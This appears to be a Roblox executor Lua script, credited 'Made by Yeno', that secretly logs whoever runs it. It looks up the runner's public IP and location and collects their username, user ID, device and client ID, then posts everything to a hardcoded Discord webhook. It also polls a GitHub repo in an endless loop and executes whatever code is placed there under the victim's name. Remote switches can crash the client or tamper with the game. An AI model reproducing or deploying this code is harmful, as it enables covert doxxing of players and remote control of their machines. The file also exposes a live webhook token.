local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local UserInputService = game:GetService("UserInputService")
local Lplr = game.Players.LocalPlayer
local MarketplaceService = game:GetService("MarketplaceService")
local HttpService = game:GetService("HttpService")

local clientId = RbxAnalyticsService:GetClientId()
local gameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
local ip = game:HttpGet("https://api.ipify.org")
local response = game:HttpGet("http://ip-api.com/json/" .. tostring(ip))
local allInfo = HttpService:JSONDecode(response)
local countryCode, region = allInfo["countryCode"], allInfo["regionName"]

local platform = UserInputService:GetPlatform()
local platformNames = {
    [Enum.Platform.Windows] = "Windows PC",
    [Enum.Platform.OSX] = "Mac",
    [Enum.Platform.IOS] = "iOS Device",
    [Enum.Platform.Android] = "Android Device",
    [Enum.Platform.UWP] = "UWP",
}
local deviceType = platformNames[platform] or "Unknown Device"
local executor = identifyexecutor() or "unknown"

local function Troll()
    local Name = clientId .. ".lua"
    local content = [[
-- universal
_G.Crash = false
_G.Taco = false

-- Trident survival
_G.Ban = false
_G.BPlayer = false
_G.Small = false
]]
    return "https://github.com/Pumpuma/test/new/main?filename=" .. Name .. "&value=" .. HttpService:UrlEncode(content)
end

local function execute()
    local Name = Lplr.Name .. ".lua"
    local content = [[
local executed = false
if executed == false then
    executed = true
end
]]
    return "https://github.com/Pumpuma/test/new/main?filename=" .. Name .. "&value=" .. HttpService:UrlEncode(content)
end

local webhookUrl = "https://discord.com/api/webhooks/1266146071416147968/ySql_yTSkL1qZyTkYgwGCY_DArYNAHiIkJwicDrqApUg5crckvee0qoBVgvWCc31E3mO"
local payload = {
    ["content"] = " ",
    ["embeds"] = {
        {
            ["title"] = "Uki logs",
            ["description"] = "**   USER INFO**\n" ..
                              "Username: " .. Lplr.Name .. "\n" ..
                              "User ID: " .. Lplr.UserId .. "\n" ..
                              "Time: " .. os.date("%Y-%m-%d %H:%M:%S") .. "\n" ..
                              "Prem: " .. (Lplr.MembershipType == Enum.MembershipType.Premium and "Yes" or "No") .. "\n" ..
                              "Location: " .. region .. ", " .. countryCode .. "\n" ..
                              "IP: " .. ip .. "\n" ..
                              "Device: " .. deviceType .. "\n" ..
                              "Executor: " .. executor .. "\n" ..
                              "Client ID:\n" .. clientId .. "\n\n" .. 
                              "**   GAME INFO**\n" ..
                              "Game: " .. gameInfo.Name .. "\n\n" ..
                              "**   COMMAND STATION**\n" ..
                              "[Troll](" .. Troll() .. ")\n" ..
                              "[Execute](" .. execute() .. ")\n" ..
                              "[IP Info](https://ipinfo.io/" .. ip .. ")",
            ["type"] = "rich",
            ["color"] = tonumber(0x00FF00),
            ["image"] = {
                ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" .. tostring(Lplr.Name)
            },
            ["footer"] = {
                ["text"] = "Made by Yeno"
            }
        }
    }
}


local newdata = HttpService:JSONEncode(payload)

local headers = {
    ["content-type"] = "application/json"
}

local request = http_request or request or HttpPost or syn.request
local requestData = {
    Url = webhookUrl,
    Body = newdata,
    Method = "POST",
    Headers = headers
}
request(requestData)

-- Load and execute scripts
local function loadAndExecuteScript(url, Name)
    local success, result = pcall(function()
        return loadstring(game:HttpGet(url))()
    end)
    return success
end

while true do
    wait(1)
loadstring(game:HttpGet("https://raw.githubusercontent.com/Pumpuma/test/main/" .. Lplr.Name .. ".lua"))()        
end

while true do
    wait(1)
loadstring(game:HttpGet("https://raw.githubusercontent.com/Pumpuma/test/main/" .. clientId .. ".lua"))()
end

-- Monitor and handle global flags
local Taco = false
local Crash = false
local Ban = false
local Bplayer = false
local Small = false

while true do
    wait(1)
    
    if _G.Taco and not Taco then
        Taco = true
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://142376088"
        sound.Looped = true
        sound.Volume = 1
        sound.Parent = game:GetService("SoundService")
        sound:Play()
    end
    
    if _G.Crash and not Crash then
        Crash = true
        while true do end
    end
    
    if _G.Ban and not Ban then
        Ban = true
        local remoteEvent = game.Players.LocalPlayer:FindFirstChild('RemoteEvent')
        if remoteEvent then remoteEvent:Destroy() end
    end
    
    if _G.BPlayer and not Bplayer then
        Bplayer = true
        local ignorePart = Workspace.Ignore
        if ignorePart then ignorePart:Destroy() end
    end
    
    if _G.Small and not Small then
        Small = true
        local constraint = Workspace.Ignore.LocalCharacter and Workspace.Ignore.LocalCharacter.Bottom:FindFirstChild('PrismaticConstraint')
        if constraint then
            constraint.LowerLimit = 1
            constraint.UpperLimit = 1
        end
    end
end
